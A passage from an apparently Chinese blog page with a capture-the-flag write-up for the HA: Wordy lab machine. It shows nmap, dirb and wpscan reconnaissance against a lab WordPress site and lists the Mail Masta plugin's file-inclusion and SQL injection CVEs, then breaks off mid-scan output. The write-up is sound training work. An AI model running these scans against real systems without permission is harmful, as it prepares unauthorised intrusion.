<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.8.0">
    <!-- so meta -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
  (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-8217582216393706",
    enable_page_level_ads: true
  });
</script>
<!-- <br> -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="信息收集 下载地址：点我  1234567891011121314151617181920➜  ~ nmap -sn 192.168.116.1/24      Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-25 22:08 CSTNmap scan report for 192.168.116.1Host is up (0.0025s la">
<meta name="keywords" content="CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="ha-wordy-Write-up">
<meta property="og:url" content="https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/index.html">
<meta property="og:site_name" content="Kali-Team">
<meta property="og:description" content="信息收集 下载地址：点我  1234567891011121314151617181920➜  ~ nmap -sn 192.168.116.1/24      Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-25 22:08 CSTNmap scan report for 192.168.116.1Host is up (0.0025s la">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2019-09-26T11:47:09.444Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ha-wordy-Write-up">
<meta name="twitter:description" content="信息收集 下载地址：点我  1234567891011121314151617181920➜  ~ nmap -sn 192.168.116.1/24      Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-25 22:08 CSTNmap scan report for 192.168.116.1Host is up (0.0025s la">
    
    
        
          
              <link rel="shortcut icon" href="https://www.gravatar.com/avatar/bc985422e4fd51abac5af2691ee33a93?s=16">
          
        
        
          
            <link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/bc985422e4fd51abac5af2691ee33a93?s=192" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/bc985422e4fd51abac5af2691ee33a93?s=180">
          
        
    
    <!-- title -->
    <title>ha-wordy-Write-up</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://www.yuque.com/kali-team">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/10/09/HA-Armour-Write-up/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/09/23/HA-Infinity-Stones-Write-up/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&text=ha-wordy-Write-up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&title=ha-wordy-Write-up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&is_video=false&description=ha-wordy-Write-up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ha-wordy-Write-up&body=Check out this article: https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&title=ha-wordy-Write-up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&title=ha-wordy-Write-up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&title=ha-wordy-Write-up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&title=ha-wordy-Write-up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.kali-team.cn/2019/09/25/ha-wordy-Write-up/&name=ha-wordy-Write-up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入"><span class="toc-number">2.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2015-8351-远程文件包含"><span class="toc-number">3.</span> <span class="toc-text">CVE-2015-8351 远程文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地文件包含"><span class="toc-number">4.</span> <span class="toc-text">本地文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传"><span class="toc-number">5.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF越权"><span class="toc-number">6.</span> <span class="toc-text">CSRF越权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#插件认证文件上传"><span class="toc-number">7.</span> <span class="toc-text">插件认证文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提Root权权限"><span class="toc-number">8.</span> <span class="toc-text">提Root权权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取Flag"><span class="toc-number">9.</span> <span class="toc-text">获取Flag</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        ha-wordy-Write-up
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kali-Team</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-09-25T14:09:46.544Z" itemprop="datePublished">2019-09-25</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/CTF/">CTF</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
<li>下载地址：<a href="https://www.vulnhub.com/entry/ha-wordy,363/" target="_blank" rel="noopener">点我</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -sn 192.168.116.1/24      </span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-25 22:08 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.116.1</span><br><span class="line">Host is up (0.0025s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.116.138</span><br><span class="line">Host is up (0.00072s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 4.94 seconds</span><br><span class="line">➜  ~ nmap -A -T4 192.168.116.138 -p-</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-25 22:09 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.116.138</span><br><span class="line">Host is up (0.0039s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.22 seconds</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li>IP为：192.168.116.138，只开放了一个80端口，主页还是<strong>Apache2</strong>的默认页。</li>
<li>先扫目录，-r不递归扫</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ dirb http://192.168.116.138 -r</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Wed Sep 25 22:17:39 2019</span><br><span class="line">URL_BASE: http://192.168.116.138/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">OPTION: Not Recursive</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.116.138/ ----</span><br><span class="line">+ http://192.168.116.138/index.html (CODE:200|SIZE:10918)                                                                                                                                                                                     </span><br><span class="line">+ http://192.168.116.138/info.php (CODE:200|SIZE:15)                                                                                                                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.116.138/javascript/                                                                                                                                                                                             </span><br><span class="line">+ http://192.168.116.138/server-status (CODE:403|SIZE:280)                                                                                                                                                                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.116.138/wordpress/                                                                                                                                                                                              </span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Wed Sep 25 22:17:42 2019</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 3</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li>发现了一个info.php，又是WordPress。</li>
</ul>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl <span class="string">"http://192.168.116.138/info.php"</span>          </span><br><span class="line"><span class="number">192.168</span><span class="number">.116</span><span class="number">.138</span>%                                                                                                                                                                                                            ➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li>访问info.php返回了服务器端的IP地址，那再扫WordPress</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ wpscan --url http://192.168.116.138/wordpress/</span><br><span class="line">_______________________________________________________________</span><br><span class="line">        __          _______   _____</span><br><span class="line">        \ \        / /  __ \ / ____|</span><br><span class="line">         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">          \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">'_ \</span></span><br><span class="line"><span class="string">           \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                       Version 3.6.3</span></span><br><span class="line"><span class="string">          Sponsored by Sucuri - https://sucuri.net</span></span><br><span class="line"><span class="string">      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] It seems like you have not updated the database for some time.</span></span><br><span class="line"><span class="string">[?] Do you want to update now? [Y]es [N]o, default: [N]y</span></span><br><span class="line"><span class="string">[i] Updating the Database ...</span></span><br><span class="line"><span class="string">[i] Update completed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://192.168.116.138/wordpress/</span></span><br><span class="line"><span class="string">[+] Started: Wed Sep 25 22:23:22 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.116.138/wordpress/</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.116.138/wordpress/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.116.138/wordpress/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Upload directory has listing enabled: http://192.168.116.138/wordpress/wp-content/uploads/</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.116.138/wordpress/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.2.3 identified (Latest, released on 2019-09-05).</span></span><br><span class="line"><span class="string"> | Detected By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.116.138/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> |  - http://192.168.116.138/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: twentysixteen</span></span><br><span class="line"><span class="string"> | Location: http://192.168.116.138/wordpress/wp-content/themes/twentysixteen/</span></span><br><span class="line"><span class="string"> | Latest Version: 2.0 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-05-07T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.116.138/wordpress/wp-content/themes/twentysixteen/readme.txt</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.116.138/wordpress/wp-content/themes/twentysixteen/style.css?ver=5.2.3</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Sixteen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentysixteen/</span></span><br><span class="line"><span class="string"> | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Detected By: Css Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 2.0 (80% confidence)</span></span><br><span class="line"><span class="string"> | Detected By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.116.138/wordpress/wp-content/themes/twentysixteen/style.css?ver=5.2.3, Match: '</span>Version: 2.0<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating All Plugins (via Passive Methods)</span></span><br><span class="line"><span class="string">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Plugin(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] mail-masta</span></span><br><span class="line"><span class="string"> | Location: http://192.168.116.138/wordpress/wp-content/plugins/mail-masta/</span></span><br><span class="line"><span class="string"> | Latest Version: 1.0 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2014-09-19T07:52:00.000Z</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Detected By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] 2 vulnerabilities identified:</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/8609</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10956</span></span><br><span class="line"><span class="string"> |      - https://www.exploit-db.com/exploits/40290/</span></span><br><span class="line"><span class="string"> |      - https://cxsecurity.com/issue/WLB-2016080220</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: Mail Masta 1.0 - Multiple SQL Injection</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/8740</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6570</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6571</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6572</span></span><br><span class="line"><span class="string"> |      - 